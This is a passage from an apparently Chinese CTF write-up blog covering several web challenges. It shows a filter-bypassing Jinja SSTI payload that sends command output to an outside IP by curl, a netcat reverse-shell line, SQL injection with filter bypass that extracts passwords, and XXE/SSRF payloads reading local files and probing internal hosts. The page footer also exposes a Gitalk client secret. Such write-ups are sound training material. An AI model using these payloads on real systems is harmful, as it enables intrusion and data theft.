<span class="comment"># 返回php的报错</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为<code>config</code> 放在最后面, 然后这个黑名单是通过循环来实现的, 那么在处理上,可能会滞后,并且这里把config替换为空,那么可以把插入payload关键字的中间,即可绕过关键字过滤了, 在博客中找一个payload</p>
<p><a href="https://hack-for.fun/posts/20200305/#Bypass-2">https://hack-for.fun/posts/20200305/#Bypass-2</a> , 把config 插进去即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;ls &#x2F;|grep flag&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 174.1.226.7 1234 -t -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>本来想用上面反弹shell 的但是没有成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407155424.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;ls &#x2F;|grep flag&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<p>得到<code>flag_1s_Hera </code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;cat &#x2F;flag_1s_Hera&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag… 挺喜欢这个类型的题目的 😄</p>
<h1 id="GWCTF-2019-blog"><a href="#GWCTF-2019-blog" class="headerlink" title="[GWCTF 2019]blog"></a>[GWCTF 2019]blog</h1><ul>
<li>我的思路: 文件上传图片马+ <code>.htaccess</code> + 文件包含解析图片马 getshell</li>
<li>遇到的问题: 因为文件包含必须要admin才行, 这里没办法实现admin身份伪造</li>
<li>看了WP: 文件名注入(Orz…几乎快忘了,之前做2018级实验班的题有一个题就是文件名注入), 这里把文件名打印在页面了可能是经过了数据库操作然后输出的</li>
<li>CBC 翻转</li>
<li>二次渲染</li>
</ul>
<p>fuzz 一下, 然后在页面看, 哪些是空格就说明哪些被过滤掉了, …… Orz 这个和fuzz 的顺序不一样… 手动fuzz把</p>
<p>过滤了有, </p>
<ul>
<li>select, 双写即可绕过<code>seleselectct</code> </li>
<li>空格, <code>&lt;&gt;</code> 绕过,发现很多情况用这个没有结果, 利用注释<code>/*123*/</code> </li>
</ul>
<p>直接<code>union/*123*/seleselectct/*123*/1,2,database()</code> 读不到数据</p>
<p>直接拿wp的payload了, 这里进行了进制转换, 可能这样才能读到数据把</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;+(selselectect(conv(substr(hex((selselectect(GROGROUPUP_CONCONCATCAT(password))frfromom(byte_user))),1,8),16,10)))+&#39;</span><br></pre></td></tr></table></figure>

<p>这里解释几个函数</p>
<ul>
<li>Hex() 函数 相等于 =&gt; <code>CONV(N,10,16)</code> ,即10进制转为16进制, 然后这里又用了conv(N,16,10), 最后得到的就是10进制数</li>
<li>Substr()函数 , 从制定字符串的第start位置开始, 截取length长度的字符串</li>
</ul>
<p>十进制的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h1><ul>
<li>cookie</li>
</ul>
<p>cookie 有两个参数, 第一个参数随着刷新次数增加而增加, 另一个参数, 只有中间一部分随机变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kxkxkxkxsh957kxkxkxkxsh</span><br><span class="line">kxkxkxkxshla1kxkxkxkxsh</span><br></pre></td></tr></table></figure>

<p>刷新两次就知道只有中间三位数在发生随机变化</p>
<p>wp 写的用脚本来跑,  以后在来做好了</p>
<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><ul>
<li>XXE SSRF 组合拳</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hosts&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>探测内网主机</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">173.122.231.9	osrc</span><br></pre></td></tr></table></figure>

<p>访问内网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;173.122.231.9&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p> 没有结果,  改为 10就可以了</p>
<h1 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h1><ul>
<li><strong>购买类的题很有可能是逻辑漏洞或者溢出</strong> </li>
<li><strong>Flask session 解密</strong></li>
<li><strong>#</strong> 格式化字符串漏洞(个人的喜欢叫法), 注释作用, 导致代码逻辑被改变</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/92170270">https://blog.csdn.net/zz_Caleb/article/details/92170270</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200409174736.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/f81b.html">https://hack-for.fun/f81b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/e280.html"><i class="fa fa-chevron-left">  </i><span>一文小总结逻辑漏洞</span></a></div><div class="next-post pull-right"><a href="/21e1.html"><span>一文小总结中间件漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>